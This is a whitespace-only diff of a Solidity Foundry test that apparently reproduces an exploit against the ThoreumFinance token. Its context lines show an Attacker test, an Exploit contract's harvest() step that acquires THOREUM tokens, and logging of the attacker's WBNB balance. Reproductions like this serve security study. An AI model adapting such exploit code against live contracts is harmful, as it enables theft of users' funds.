@@ -27,6 +27,7 @@ IWBNB constant wbnb = IWBNB(payable(wbnb_addr));
 THOREUMInterface constant THOREUM = THOREUMInterface(thoreum_addr);
 
 contract Attacker is Test {
+
     //  forge test --contracts ./src/test/ThoreumFinance_exp.sol -vvv
     function setUp() public {
         cheat.label(address(router), "router");
@@ -43,9 +44,11 @@ contract Attacker is Test {
         exploit.harvest();
         emit log_named_decimal_uint("[End] Attacker wbnb Balance", wbnb.balanceOf(exploiter), 18);
     }
+
 }
 
 contract Exploit is Test {
+
     function harvest() public {
         //  step1: get some  thoreum token
         vm.deal(address(this), 0.003 ether);
@@ -86,9 +89,12 @@ contract Exploit is Test {
     }
 
     receive() external payable {}
+
 }
 
 interface THOREUMInterface is IERC20 {
+
     function deposit() external payable;
     function withdraw(uint256 wad) external;
+
 }
